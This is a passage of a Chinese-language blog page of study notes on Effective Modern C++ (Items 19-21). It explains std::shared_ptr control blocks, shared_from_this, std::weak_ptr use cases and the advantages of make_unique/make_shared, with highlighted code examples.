class="code"><div class="hljs code-wrapper"><pre><code class="hljs CPP"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Widget&gt;&gt; vpw&#123; pw1, pw2 &#125;;<br></code></pre></div></td></tr></table></figure><p>它们也能相互赋值，也可以传入一个形参为<code>std::shared_ptr&lt;Widget&gt;</code>的函数。但是自定义删除器类型不同的<code>std::unique_ptr</code>就不行，因为<code>std::unique_ptr</code>把删除器视作类型的一部分。</p><p>另一个不同于<code>std::unique_ptr</code>的地方是，指定自定义删除器不会改变<code>std::shared_ptr</code>对象的大小。不管删除器是什么，一个<code>std::shared_ptr</code>对象都是两个指针大小。这是个好消息，但是它应该让你隐隐约约不安。自定义删除器可以是函数对象，函数对象可以包含任意多的数据。它意味着函数对象是任意大的。</p><p>引用计数是另一个更大的数据结构的一部分，那个数据结构通常叫做<strong>控制块</strong>（<em>controlblock</em>）。每个<code>std::shared_ptr</code>管理的对象都有个相应的控制块。控制块除了包含引用计数值外还有一个自定义删除器的拷贝，当然前提是存在自定义删除器。如果用户还指定了自定义分配器，控制块也会包含一个分配器的拷贝。控制块可能还包含一些额外的数据，一个次级引用计数<em>weakcount</em>。</p><p><img src="images/Effective-Modern-Cpp/image-20230918083719236.png" srcset="/img/loading.gif" lazyload alt="image-20230918083719236" style="zoom:67%;"></p><p>对于一个创建指向对象的<code>std::shared_ptr</code>的函数来说不可能知道是否有其他<code>std::shared_ptr</code>早已指向那个对象，所以控制块的创建会遵循下面几条规则：</p><ul><li><strong><code>std::make_shared</code>总是创建一个控制块</strong>。它创建一个要指向的新对象，所以可以肯定<code>std::make_shared</code>调用时对象不存在其他控制块。</li><li><strong>当从独占指针（即<code>std::unique_ptr</code>或者<code>std::auto_ptr</code>）上构造出<code>std::shared_ptr</code>时会创建控制块</strong>。独占指针没有使用控制块，所以指针指向的对象没有关联控制块。（作为构造的一部分，<code>std::shared_ptr</code>侵占独占指针所指向的对象的独占权，所以独占指针被设置为null）</li><li><strong>当从原始指针上构造出<code>std::shared_ptr</code>时会创建控制块</strong>。如果你想从一个早已存在控制块的对象上创建<code>std::shared_ptr</code>，你将假定传递一个<code>std::shared_ptr</code>或者<code>std::weak_ptr</code>。作为构造函数实参，而不是原始指针。用<code>std::shared_ptr</code>或者<code>std::weak_ptr</code>作为构造函数实参创建<code>std::shared_ptr</code>不会创建新控制块，因为它可以依赖传递来的智能指针指向控制块。</li></ul><p>从原始指针上构造超过一个<code>std::shared_ptr</code>会造成未定义行为，因为指向的对象有多个控制块关联。多个控制块意味着多个引用计数值，多个引用计数值意味着对象将会被销毁多次（每个引用计数一次）。那意味着像下面的代码是有问题的：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> pw = <span class="hljs-keyword">new</span> Widget;                           <span class="hljs-comment">//pw是原始指针</span><br>…<br><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Widget&gt; <span class="hljs-title">spw1</span><span class="hljs-params">(pw, loggingDel)</span></span>;   <span class="hljs-comment">//为*pw创建控制块</span><br>…<br><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Widget&gt; <span class="hljs-title">spw2</span><span class="hljs-params">(pw, loggingDel)</span></span>;   <span class="hljs-comment">//为*pw创建第二个控制块</span><br></code></pre></div></td></tr></table></figure><p>使用智能指针而不是原始指针。</p><p>使用 <code>std::shared_ptr</code>的建议是：第一，避免传给<code>std::shared_ptr</code>构造函数原始指针。通常替代方案是使用<code>std::make_shared</code>，不过用<code>std::make_shared</code>就没办法使用自定义删除器。第二，如果你必须传给<code>std::shared_ptr</code>构造函数原始指针，直接传<code>new</code>出来的结果，不要传指针变量。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Widget&gt; <span class="hljs-title">spw1</span><span class="hljs-params">(<span class="hljs-keyword">new</span> Widget,    <span class="hljs-comment">//直接使用new的结果</span></span></span><br><span class="hljs-function"><span class="hljs-params">                             loggingDel)</span></span>;<br></code></pre></div></td></tr></table></figure><p>创建<code>spw2</code>也会很自然的用<code>spw1</code>作为初始化参数（即用<code>std::shared_ptr</code>拷贝构造函数），那就没什么问题了：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs CPP"><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Widget&gt; <span class="hljs-title">spw2</span><span class="hljs-params">(spw1)</span></span>;         <span class="hljs-comment">//spw2使用spw1一样的控制块</span><br></code></pre></div></td></tr></table></figure><h3><span id="this指针避免创建多余的控制块">this指针：避免创建多余的控制块</span></h3><p><code>std::enable_shared_from_this</code>。如果你想创建一个用<code>std::shared_ptr</code>管理的类，这个类能够用<code>this</code>指针安全地创建一个<code>std::shared_ptr</code>，<code>std::enable_shared_from_this</code>就可作为基类的模板类。<code>Widget</code>将会继承自<code>std::enable_shared_from_this</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span>:</span> <span class="hljs-keyword">public</span> <span class="hljs-built_in">std</span>::enable_shared_from_this&lt;Widget&gt; &#123;<br><span class="hljs-keyword">public</span>:<br>    …<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process</span><span class="hljs-params">()</span></span>;<br>    …<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>这个标准名字就是奇异递归模板模式（<em>The Curiously RecurringTemplate Pattern</em>（<em>CRTP</em>））。</p><p><code>std::enable_shared_from_this</code>定义了一个成员函数，成员函数会创建指向当前对象的<code>std::shared_ptr</code>却不创建多余控制块。这个成员函数就是<code>shared_from_this</code>，无论在哪当你想在成员函数中使用<code>std::shared_ptr</code>指向<code>this</code>所指对象时都请使用它。这里有个<code>Widget::process</code>的安全实现：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Widget::process</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//和之前一样，处理Widget</span><br>    …<br>    <span class="hljs-comment">//把指向当前对象的std::shared_ptr加入processedWidgets</span><br>    processedWidgets.emplace_back(shared_from_this());<br>&#125;<br></code></pre></div></td></tr></table></figure><p>从内部来说，<code>shared_from_this</code>查找当前对象控制块，然后创建一个新的<code>std::shared_ptr</code>关联这个控制块。设计的依据是当前对象已经存在一个关联的控制块。</p><p>要想符合设计依据的情况，必须已经存在一个指向当前对象的<code>std::shared_ptr</code>（比如调用<code>shared_from_this</code>的成员函数外面已经存在一个<code>std::shared_ptr</code>）。如果没有<code>std::shared_ptr</code>指向当前对象（即当前对象没有关联控制块），行为是未定义的，<code>shared_from_this</code>通常抛出一个异常。</p><p>要想防止客户端在存在一个指向对象的<code>std::shared_ptr</code>前先调用含有<code>shared_from_this</code>的成员函数，继承自<code>std::enable_shared_from_this</code>的类通常将它们的构造函数声明为<code>private</code>，并且让客户端通过返回<code>std::shared_ptr</code>的工厂函数创建对象。以<code>Widget</code>为例，代码可以是这样：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span>:</span> <span class="hljs-keyword">public</span> <span class="hljs-built_in">std</span>::enable_shared_from_this&lt;Widget&gt; &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">//完美转发参数给private构造函数的工厂函数</span><br>    <span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span>... Ts&gt;<br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Widget&gt; <span class="hljs-title">create</span><span class="hljs-params">(Ts&amp;&amp;... params)</span></span>;<br>    …<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process</span><span class="hljs-params">()</span></span>;     <span class="hljs-comment">//和前面一样</span><br>    …<br><span class="hljs-keyword">private</span>:<br>    …                   <span class="hljs-comment">//构造函数</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>确保需要先调用 create，才能调用 process。</p><h3><span id="shared_ptr-开销">shared_ptr 开销</span></h3><p>控制块通常只占几个<em>word</em>大小，自定义删除器和分配器可能会让它变大一点。通常控制块的实现比你想的更复杂一些。它使用继承，甚至里面还有一个虚函数（用来确保指向的对象被正确销毁）。这意味着使用<code>std::shared_ptr</code>，会带来使用虚函数带来的成本。</p><p>使用默认删除器和默认分配器，使用<code>std::make_shared</code>创建<code>std::shared_ptr</code>，产生的控制块只需三个word大小。它的分配基本上是无开销的。</p><p>对<code>std::shared_ptr</code>解引用的开销不会比原始指针高。执行需要原子引用计数修改的操作需要承担一两个原子操作开销，这些操作通常都会一一映射到机器指令上，所以即使对比非原子指令来说，原子指令开销较大，但是它们仍然只是单个指令上的。对于每个被<code>std::shared_ptr</code>指向的对象来说，控制块中的虚函数机制产生的开销通常只需要承受一次，即对象销毁的时候。</p><p>如果独占资源可行或者<strong>可能</strong>可行，用<code>std::unique_ptr</code>是一个更好的选择。它的性能表现更接近于原始指针，并且从<code>std::unique_ptr</code>升级到<code>std::shared_ptr</code>也很容易，因为<code>std::shared_ptr</code>可以从<code>std::unique_ptr</code>上创建。</p><p>从 <code>std::shared_ptr</code>转换到 <code>std::unique_ptr</code>是不行的。当你的资源由<code>std::shared_ptr</code>管理，现在又想修改资源生命周期管理方式是没有办法的。即使引用计数为一，你也不能重新修改资源所有权，改用<code>std::unique_ptr</code>管理它。资源和指向它的<code>std::shared_ptr</code>的签订的所有权协议是“除非死亡否则永不分开”。不能分离，不能废除，没有特许。</p><p><code>std::shared_ptr</code>不能处理的另一个东西是数组。和<code>std::unique_ptr</code>不同的是，<code>std::shared_ptr</code>的API设计之初就是针对单个对象的，没有办法<code>std::shared_ptr&lt;T[]&gt;</code>。</p><p><code>std::shared_ptr</code>没有提供<code>operator[]</code>，所以数组索引操作需要借助怪异的指针算术。另一方面，<code>std::shared_ptr</code>支持转换为指向基类的指针，这对于单个对象来说有效，但是当用于数组类型时这是容易出问题。（出于这个原因，<code>std::unique_ptr&lt;T[]&gt;</code>API禁止这种转换。）</p><p>更重要的是，C++11已经提供了很多内置数组的候选方案（比如<code>std::array</code>，<code>std::vector</code>，<code>std::string</code>）。所以，声明一个指向数组的智能指针几乎总是糟糕的设计。</p><h3><span id="结论">结论</span></h3><ul><li><code>std::shared_ptr</code>为有共享所有权的任意资源提供一种自动垃圾回收的便捷方式。</li><li>较之于<code>std::unique_ptr</code>，<code>std::shared_ptr</code>对象通常大两倍，控制块会产生开销，需要原子性的引用计数修改操作。</li><li><code>std::shared_ptr</code>默认资源销毁是通过<code>delete</code>，但是也支持自定义删除器。但是删除器的类型不是<code>std::shared_ptr</code> 的类型的一部分。</li><li>避免从原始指针变量上创建<code>std::shared_ptr</code>。</li></ul><h2><span id="20当stdshared_ptr可能悬空时使用stdweak_ptr">20当<code>std::shared_ptr</code>可能悬空时使用<code>std::weak_ptr</code></span></h2><p>一个真正的智能指针应该跟踪所指对象，在悬空时知晓，悬空（<em>dangle</em>）就是指针指向的对象不再存在。这就是对<code>std::weak_ptr</code>最精确的描述。</p><p><code>std::weak_ptr</code>不能解引用，也不能测试是否为空值。因为<code>std::weak_ptr</code>不是一个独立的智能指针。它是<code>std::shared_ptr</code>的增强。</p><p><code>std::weak_ptr</code>通常从<code>std::shared_ptr</code>上创建。当从<code>std::shared_ptr</code>上创建<code>std::weak_ptr</code>时两者指向相同的对象，但是<code>std::weak_ptr</code>不会影响所指对象的引用计数。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> spw =                      <span class="hljs-comment">//spw创建之后，指向的Widget的</span><br>    <span class="hljs-built_in">std</span>::make_shared&lt;Widget&gt;(); <span class="hljs-comment">//引用计数（ref count，RC）为1。</span><br>                               <br>…<br><span class="hljs-function"><span class="hljs-built_in">std</span>::weak_ptr&lt;Widget&gt; <span class="hljs-title">wpw</span><span class="hljs-params">(spw)</span></span>; <span class="hljs-comment">//wpw指向与spw所指相同的Widget。RC仍为1</span><br>…<br>spw = <span class="hljs-literal">nullptr</span>;                  <span class="hljs-comment">//RC变为0，Widget被销毁。</span><br>                                <span class="hljs-comment">//wpw现在悬空</span><br></code></pre></div></td></tr></table></figure><p>悬空的<code>std::weak_ptr</code>被称作已经<strong>expired</strong>（过期）。你可以用它直接做测试：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs CPP"><span class="hljs-keyword">if</span> (wpw.expired()) …            <span class="hljs-comment">//如果wpw没有指向对象…</span><br></code></pre></div></td></tr></table></figure><p>但是通常你期望的是检查<code>std::weak_ptr</code>是否已经过期，如果没有过期则访问其指向的对象。不过，将检查是否过期和解引用分开会引入竞态条件：在调用<code>expired</code>和解引用操作之间，另一个线程可能对指向这对象的<code>std::shared_ptr</code>重新赋值或者析构，并由此造成对象已析构。这种情况下，你的解引用将会产生未定义行为。</p><p>你需要的是一个原子操作检查<code>std::weak_ptr</code>是否已经过期，如果没有过期就访问所指对象。这可以通过从<code>std::weak_ptr</code>创建<code>std::shared_ptr</code>来实现，具体有两种形式可以从<code>std::weak_ptr</code>上创建<code>std::shared_ptr</code>，具体用哪种取决于<code>std::weak_ptr</code>过期时你希望<code>std::shared_ptr</code>表现出什么行为。</p><p>一种形式是<code>std::weak_ptr::lock</code>，它返回一个<code>std::shared_ptr</code>，如果<code>std::weak_ptr</code>过期这个<code>std::shared_ptr</code>为空：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Widget&gt; spw1 = wpw.lock();  <span class="hljs-comment">//如果wpw过期，spw1就为空</span><br> <br><span class="hljs-keyword">auto</span> spw2 = wpw.lock();                     <span class="hljs-comment">//同上，但是使用auto</span><br></code></pre></div></td></tr></table></figure><p>另一种形式是以<code>std::weak_ptr</code>为实参构造<code>std::shared_ptr</code>。这种情况中，如果<code>std::weak_ptr</code>过期，会抛出一个异常：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Widget&gt; <span class="hljs-title">spw3</span><span class="hljs-params">(wpw)</span></span>;          <span class="hljs-comment">//如果wpw过期，抛出std::bad_weak_ptr异常</span><br></code></pre></div></td></tr></table></figure><h3><span id="一个例子">一个例子</span></h3><p>考虑一个工厂函数，它基于一个唯一ID从只读对象上产出智能指针。根据条款18的描述，工厂函数会返回一个该对象类型的<code>std::unique_ptr</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;<span class="hljs-keyword">const</span> Widget&gt; <span class="hljs-title">loadWidget</span><span class="hljs-params">(WidgetID id)</span></span>;<br></code></pre></div></td></tr></table></figure><p>如果调用<code>loadWidget</code>是一个昂贵的操作（比如它操作文件或者数据库I/O）并且重复使用ID很常见，一个合理的优化是再写一个函数除了完成<code>loadWidget</code>做的事情之外再缓存它的结果。另一个合理的优化可以是当<code>Widget</code>不再使用的时候销毁它的缓存。</p><p>对于可缓存的工厂函数，返回<code>std::unique_ptr</code>不是好的选择。调用者应该接收缓存对象的智能指针，调用者也应该确定这些对象的生命周期，但是缓存本身也需要一个指针指向它所缓存的对象。缓存对象的指针需要知道它是否已经悬空，因为当工厂客户端使用完工厂产生的对象后，对象将被销毁，关联的缓存条目会悬空。所以缓存应该使用<code>std::weak_ptr</code>，这可以知道是否已经悬空。这意味着工厂函数返回值类型应该是<code>std::shared_ptr</code>，因为只有当对象的生命周期由<code>std::shared_ptr</code>管理时，<code>std::weak_ptr</code>才能检测到悬空。</p><p>一个简版的实现：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;<span class="hljs-keyword">const</span> Widget&gt; <span class="hljs-title">fastLoadWidget</span><span class="hljs-params">(WidgetID id)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unordered_map</span>&lt;WidgetID,<br>                              <span class="hljs-built_in">std</span>::weak_ptr&lt;<span class="hljs-keyword">const</span> Widget&gt;&gt; cache;<br>                                        <span class="hljs-comment">//std::weak_ptr&lt;const Widget&gt;</span><br>    <span class="hljs-keyword">auto</span> objPtr = cache[id].lock();     <span class="hljs-comment">//objPtr是去缓存对象的</span><br>                                        <span class="hljs-comment">//std::shared_ptr（或</span><br>                                        <span class="hljs-comment">//当对象不在缓存中时为null）</span><br><br>    <span class="hljs-keyword">if</span> (!objPtr) &#123;                      <span class="hljs-comment">//如果不在缓存中</span><br>        objPtr = loadWidget(id);        <span class="hljs-comment">//加载它</span><br>        cache[id] = objPtr;             <span class="hljs-comment">//缓存它</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> objPtr;<br>&#125;<br></code></pre></div></td></tr></table></figure><blockquote><p><code>fastLoadWidget</code>的实现仍有以下问题：缓存可能会累积过期的<code>std::weak_ptr</code>，这些指针对应了不再使用的<code>Widget</code>（也已经被销毁了）。</p></blockquote><h3><span id="另一个例子">另一个例子</span></h3><p>考虑第二个用例：观察者设计模式（Observer design pattern）。</p><p>此模式的主要组件是subjects（状态可能会更改的对象）和observers（状态发生更改时要通知的对象）。在大多数实现中，每个subject都包含一个数据成员，该成员持有指向其observers的指针。这使subjects很容易发布状态更改通知。</p><p>subjects对控制observers的生命周期（即它们什么时候被销毁）没有兴趣，但是subjects对确保另一件事具有极大的兴趣，那事就是一个observer被销毁时，不再尝试访问它。一个合理的设计是每个subject持有一个<code>std::weak_ptr</code>s容器指向observers，因此可以在使用前检查是否已经悬空。</p><h3><span id="最后一个例子">最后一个例子</span></h3><p>考虑一个持有三个对象<code>A</code>、<code>B</code>、<code>C</code>的数据结构，<code>A</code>和<code>C</code>共享<code>B</code>的所有权，因此持有<code>std::shared_ptr</code>：</p><figure><img src="images/Effective-Modern-Cpp/item20_fig1.png" srcset="/img/loading.gif" lazyload alt="item20_fig1"><figcaption aria-hidden="true">item20_fig1</figcaption></figure><p>假定从B指向A的指针也很有用。应该使用哪种指针？</p><figure><img src="images/Effective-Modern-Cpp/item20_fig2.png" srcset="/img/loading.gif" lazyload alt="item20_fig2"><figcaption aria-hidden="true">item20_fig2</figcaption></figure><p>有三种选择：</p><ul><li><strong>原始指针</strong>。使用这种方法，如果<code>A</code>被销毁，但是<code>C</code>继续指向<code>B</code>，<code>B</code>就会有一个指向<code>A</code>的悬空指针。而且<code>B</code>不知道指针已经悬空，所以<code>B</code>可能会继续访问，就会导致未定义行为。</li><li><strong><code>std::shared_ptr</code></strong>。这种设计，<code>A</code>和<code>B</code>都互相持有对方的<code>std::shared_ptr</code>，导致的<code>std::shared_ptr</code>环状结构（<code>A</code>指向<code>B</code>，<code>B</code>指向<code>A</code>）阻止<code>A</code>和<code>B</code>的销毁。甚至<code>A</code>和<code>B</code>无法从其他数据结构访问了（比如，<code>C</code>不再指向<code>B</code>），每个的引用计数都还是1。如果发生了这种情况，<code>A</code>和<code>B</code>都被泄漏：程序无法访问它们，但是资源并没有被回收。</li><li><strong><code>std::weak_ptr</code></strong>。这避免了上述两个问题。如果<code>A</code>被销毁，<code>B</code>指向它的指针悬空，但是<code>B</code>可以检测到这件事。尤其是，尽管<code>A</code>和<code>B</code>互相指向对方，<code>B</code>的指针不会影响<code>A</code>的引用计数，因此在没有<code>std::shared_ptr</code>指向<code>A</code>时不会导致<code>A</code>无法被销毁。</li></ul><blockquote><p>但是，需要注意使用<code>std::weak_ptr</code>打破<code>std::shared_ptr</code>循环并不常见。在严格分层的数据结构比如树中，子节点只被父节点持有。当父节点被销毁时，子节点就被销毁。从父到子的链接关系可以使用<code>std::unique_ptr</code>很好的表征。从子到父的反向连接可以使用原始指针安全实现，因为子节点的生命周期肯定短于父节点。因此没有子节点解引用一个悬空的父节点指针这样的风险。</p></blockquote><p>从效率角度来看，<code>std::weak_ptr</code>与<code>std::shared_ptr</code>基本相同。两者的大小是相同的，使用相同的控制块。构造、析构、赋值操作涉及引用计数的原子操作。</p><blockquote><p>虽然，<code>std::weak_ptr</code>不参与对象的<strong>共享所有权</strong>，因此不影响<strong>指向对象的引用计数</strong>。实际上在控制块中还是有第二个引用计数，<code>std::weak_ptr</code>操作的是第二个引用计数。</p></blockquote><h3><span id="结论">结论</span></h3><ul><li>用<code>std::weak_ptr</code>替代可能会悬空的<code>std::shared_ptr</code>。</li><li><code>std::weak_ptr</code>的潜在使用场景包括：缓存、观察者列表、打破<code>std::shared_ptr</code>环状结构。</li></ul><h2><span id="21优先考虑使用stdmake_unique和stdmake_shared而非直接使用new">21优先考虑使用<code>std::make_unique</code>和<code>std::make_shared</code>，而非直接使用<code>new</code></span></h2><p><code>std::make_shared</code>是C++11标准的一部分，但是，<code>std::make_unique</code>是从C++14开始加入标准库。</p><p>一个基础版本的<code>std::make_unique</code>是很容易自己写出的，如下：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T, <span class="hljs-keyword">typename</span>... Ts&gt;<br><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;T&gt; <span class="hljs-title">make_unique</span><span class="hljs-params">(Ts&amp;&amp;... params)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;T&gt;(<span class="hljs-keyword">new</span> T(<span class="hljs-built_in">std</span>::forward&lt;Ts&gt;(params)...));<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这种形式的函数不支持数组和自定义析构（见条款18）</p><blockquote><p><code>std::make_unique</code>和<code>std::make_shared</code>是三个<strong>make函数</strong>中的两个：接收任意的多参数集合，完美转发到构造函数去动态分配一个对象，然后返回这个指向这个对象的指针。</p><p>第三个<code>make</code>函数是<code>std::allocate_shared</code>。它行为和<code>std::make_shared</code>一样，只不过第一个参数是用来动态分配内存的<em>allocator</em>对象。</p></blockquote><h3><span id="使用-stdmake_unique的理由一">使用 <code>std::make_unique</code>的理由一</span></h3><p>例如：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">upw1</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::make_unique&lt;Widget&gt;())</span></span>;      <span class="hljs-comment">//使用make函数</span><br><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;Widget&gt; <span class="hljs-title">upw2</span><span class="hljs-params">(<span class="hljs-keyword">new</span> Widget)</span></span>;   <span class="hljs-comment">//不使用make函数</span><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">spw1</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::make_shared&lt;Widget&gt;())</span></span>;      <span class="hljs-comment">//使用make函数</span><br><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Widget&gt; <span class="hljs-title">spw2</span><span class="hljs-params">(<span class="hljs-keyword">new</span> Widget)</span></span>;   <span class="hljs-comment">//不使用make函数</span><br></code></pre></div></td></tr></table></figure><p>我高亮了关键区别：使用<code>new</code>的版本重复了类型，但是<code>make</code>函数的版本没有。</p><p>重复写类型和软件工程里面一个关键原则相冲突：应该避免重复代码。源代码中的重复增加了编译的时间，会导致目标代码冗余，并且通常会让代码库使用更加困难。</p><p>它经常演变成不一致的代码，而代码库中的不一致常常导致bug。</p><h3><span id="使用-stdmake_unique的理由二">使用 <code>std::make_unique</code>的理由二</span></h3><p>在调用<code>processWidget</code>时使用了<code>new</code>而不是<code>std::make_shared</code>：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">processWidget(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Widget&gt;(<span class="hljs-keyword">new</span> Widget),  <span class="hljs-comment">//潜在的资源泄漏！</span><br>              computePriority());<br></code></pre></div></td></tr></table></figure><p>内存泄漏的原因在于：</p><p>在运行时，一个函数的实参必须先被计算，这个函数再被调用，所以在调用<code>processWidget</code>之前，必须执行以下操作，<code>processWidget</code>才开始执行：</p><ul><li>表达式“<code>new Widget</code>”必须计算，例如，一个<code>Widget</code>对象必须在堆上被创建</li><li>负责管理<code>new</code>出来指针的<code>std::shared_ptr&lt;Widget&gt;</code>构造函数必须被执行</li><li><code>computePriority</code>必须运行</li></ul><p>而编译器不保证按照顺序生成代码。</p><p>虽然“<code>new Widget</code>”必须在<code>std::shared_ptr</code>的构造函数被调用前执行，因为<code>new</code>出来的结果作为构造函数的实参，但<code>computePriority</code>可能在这之前，之后，或者<strong>之间</strong>执行。也就是说，编译器可能按照这个执行顺序生成代码：</p><ol type="1"><li>执行“<code>new Widget</code>”</li><li>执行<code>computePriority</code></li><li>运行<code>std::shared_ptr</code>构造函数</li></ol><p>在运行时<code>computePriority</code>产生了异常，那么第一步动态分配的<code>Widget</code>就会泄漏。因为它永远都不会被第三步的<code>std::shared_ptr</code>所管理了。</p><p>使用<code>std::make_shared</code>可以防止这种问题。调用代码看起来像是这样：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">processWidget(<span class="hljs-built_in">std</span>::make_shared&lt;Widget&gt;(),   <span class="hljs-comment">//没有潜在的资源泄漏</span><br>              computePriority());<br></code></pre></div></td></tr></table></figure><p>在运行时，<code>std::make_shared</code>和<code>computePriority</code>其中一个会先被调用。</p><h3><span id="使用-stdmake_unique的理由三">使用 <code>std::make_unique</code>的理由三</span></h3><p>使用<code>std::make_shared</code>允许编译器生成更小，更快的代码，并使用更简洁的数据结构。考虑以下对new的直接使用：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td 